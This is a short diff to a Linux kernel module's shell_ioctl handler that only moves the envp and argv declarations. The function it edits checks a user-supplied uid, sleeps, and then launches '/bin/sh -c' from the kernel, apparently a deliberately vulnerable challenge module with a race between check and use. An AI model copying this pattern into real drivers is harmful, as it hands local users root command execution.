@@ -68,12 +68,19 @@ static long shell_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
 	if (udat.uid == kernel_uid.val) {
 		int rc;
 		struct subprocess_info *sub_info;
+		char **argv;
+		static char *envp[] = {
+			"HOME=/",
+			"TERM=linux",
+			"PATH=/sbin:/usr/sbin:/bin:/usr/bin",
+			NULL
+		};
 
 		printk(KERN_INFO "UID: %d EQUALS %d", udat.uid, kernel_uid.val);
 
 		usleep_range(1000000, 1000001);
 		
-		char **argv = kmalloc(sizeof(char *[4]), GFP_KERNEL);
+		argv = kmalloc(sizeof(char *[4]), GFP_KERNEL);
 
 		if (!argv)
 			return -ENOMEM;
@@ -84,13 +91,6 @@ static long shell_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
 			return -EFAULT;
 
 		real_uid = udat.uid;
-
-		static char *envp[] = {
-			"HOME=/",
-			"TERM=linux",
-			"PATH=/sbin:/usr/sbin:/bin:/usr/bin",
-			NULL
-		};
 
 		argv[0] = "/bin/sh";
 		argv[1] = "-c";
